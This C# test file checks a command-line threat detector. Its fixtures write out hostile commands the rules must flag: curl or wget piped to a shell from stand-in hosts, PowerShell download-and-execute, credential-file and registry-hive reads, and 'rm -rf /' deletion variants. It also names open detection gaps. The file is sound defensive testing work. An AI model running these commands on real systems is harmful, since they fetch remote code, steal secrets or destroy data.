using Foreman.Core.Heuristics;

namespace Foreman.Core.Tests.Heuristics;

/// <summary>
/// Red-team fixture corpus for the heuristic engine — the regression net the audit asked for.
///
/// MustMatch: realistic malicious / evasion variants that SHOULD fire a specific rule (asserts the
/// exact rule id wins, so severity-ordering changes are caught too). MustNotMatch: benign command
/// lines that must fire NO rule, so tightening a regex can't introduce false positives unnoticed.
///
/// Add a row whenever a detection gap is found or a rule is tuned. Known still-open gaps that are
/// deliberately NOT asserted here (would fail today): PowerShell Copy-Item credential reads, browser
/// password-DB copies via bracketed paths — tracked for a future detection pass.
/// </summary>
public sealed class DetectionFixtureTests : IClassFixture<PatternLibraryFixture>
{
    private readonly CommandAnalyzer _analyzer = CommandAnalyzer.Instance;

    // (ruleId, commandLine) — each must resolve to exactly this rule.
    public static IEnumerable<object[]> MustMatch() => new[]
    {
        // net-001 curl|bash incl. pipe-chain evasion (one stage between fetch and shell)
        T("net-001", "curl http://evil.com | bash"),
        T("net-001", "curl -fsSL https://x.io/s.sh|sh"),
        T("net-001", "wget https://bad.example | bash"),
        T("net-001", "curl https://x/s.sh | tee /tmp/s.sh | bash"),
        T("net-001", "curl -fsSL http://x | tr -d '\\r' | sh"),

        // net-002 download + Invoke-Expression
        T("net-002", "iex (iwr 'http://evil.com/p.ps1')"),
        T("net-002", "Invoke-Expression (Invoke-WebRequest 'http://x')"),

        // win-001 encoded PowerShell incl. pwsh + shorter/quoted payloads
        T("win-001", "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"),
        T("win-001", "pwsh -enc SQBFAFgAIABoAGkAIQ=="),
        T("win-001", "powershell.exe -EncodedCommand SGVsbG8gV29ybGQgdGVzdA=="),

        // cred-003 AWS credentials read incl. trailing redirect/pipe (was $-anchored)
        T("cred-003", "cat ~/.aws/credentials"),
        T("cred-003", "cat ~/.aws/credentials > /tmp/x.txt"),
        T("cred-003", "type C:\\Users\\u\\.aws\\credentials"),

        // cred-001 registry hive dump
        T("cred-001", "reg export HKLM\\SAM C:\\backup.reg"),
        T("cred-001", "reg save HKLM\\SYSTEM sys.hiv"),

        // del-001 critical recursive delete incl. SEPARATED flags (rm -r -f) — the canonical evasion
        T("del-001", "rm -rf /"),
        T("del-001", "rm -fr /usr"),
        T("del-001", "rm -r -f /etc"),
        T("del-001", "rm -f -r /"),
        T("del-001", "sudo rm -rf --no-preserve-root /"),

        // del-005 recursive delete of relative path incl. separated flags
        T("del-005", "rm -rf ./build"),
        T("del-005", "rm -r -f ./node_modules"),
        T("del-005", "rm -fr ."),

        // del-012 git clean force
        T("del-012", "git clean -fdx"),
    };

    // Benign command lines that must fire NO rule (false-positive guard).
    public static IEnumerable<object[]> MustNotMatch() => new[]
    {
        B("rm file.txt"),
        B("rm -r /tmp/build"),               // -r only, no force → not del-001/005
        B("rm -r ./node_modules"),           // -r only, no force
        B("cp -rf src dst"),                 // cp, not rm
        B("ls -la /etc"),
        B("node server.js --port 3000 --host 0.0.0.0"),
        B("git commit -m \"remove the old token cache and password reset flow\""),
        B("cat README.md"),
        B("curl https://api.example.com/data.json -o out.json"),   // download, no pipe-to-shell
        B("powershell -NoProfile -Command Get-Process"),
        B("dotnet build Foreman.slnx -c Release"),
        B("git status"),
    };

    private static object[] T(string ruleId, string cmd) => new object[] { ruleId, cmd };
    private static object[] B(string cmd) => new object[] { cmd };

    [Theory]
    [MemberData(nameof(MustMatch))]
    public void Detects_EvasionAndMaliciousVariants(string ruleId, string cmd)
    {
        var match = _analyzer.Analyze(cmd);
        Assert.NotNull(match);
        Assert.Equal(ruleId, match.RuleId);
    }

    [Theory]
    [MemberData(nameof(MustNotMatch))]
    public void DoesNotFalsePositive_OnBenignCommands(string cmd)
        => Assert.Null(_analyzer.Analyze(cmd));
}
